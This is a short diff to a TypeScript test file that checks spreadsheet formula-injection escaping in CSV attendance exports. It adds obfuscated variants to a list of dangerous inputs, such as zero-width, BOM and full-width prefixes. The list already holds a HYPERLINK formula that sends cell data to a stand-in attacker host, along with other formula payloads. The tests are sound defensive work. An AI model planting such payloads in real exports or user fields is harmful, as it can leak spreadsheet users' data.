@@ -10,7 +10,11 @@ import { AttendanceReportsService, type MonthSheetRow } from '../../modules/atte
  * spreadsheet formula (= + - @ tab CR), so a business name, locality or person
  * name typed as "=HYPERLINK(...)" opens as text in Excel, never as a formula.
  */
-const DANGEROUS = ['=HYPERLINK("https://evil.example?x="&A1,"x")', '+91 1+1', '-2+3', '@SUM(A1)', '\t=1+1', '\r=1+1'];
+const DANGEROUS = [
+  '=HYPERLINK("https://evil.example?x="&A1,"x")', '+91 1+1', '-2+3', '@SUM(A1)', '\t=1+1', '\r=1+1',
+  // L1: hidden behind spaces, zero-width characters, a BOM, or written full-width.
+  ' =1+1', '\u200b=1+1', '\ufeff=1+1', '\u00a0@SUM(A1)', '\uff1d1+1', '\uff0bcmd',
+];
 
 function cellsOf(csv: string): string[] {
   // Enough of a CSV reader for these tests: quoted cells may hold commas, quotes and line breaks.
